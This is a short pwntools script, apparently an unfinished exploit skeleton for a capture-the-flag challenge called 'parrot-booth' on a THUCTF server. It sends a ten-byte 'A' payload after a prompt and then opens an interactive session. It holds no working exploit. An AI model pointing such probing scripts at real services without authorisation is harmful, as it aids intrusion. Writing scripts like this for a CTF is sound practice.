#Made by fly_autumn
#x64 ......
from pwn import *
#p = process("./parrot-booth")
p = remote("chal.thuctf.redbud.info",34289)
elf = ELF("./parrot-booth")
context(os="linux",arch="amd64")

payload = b"A"*10
p.recvuntil(b"> ")
p.sendline(payload)
p.recvuntil(payload)

p.interactive()
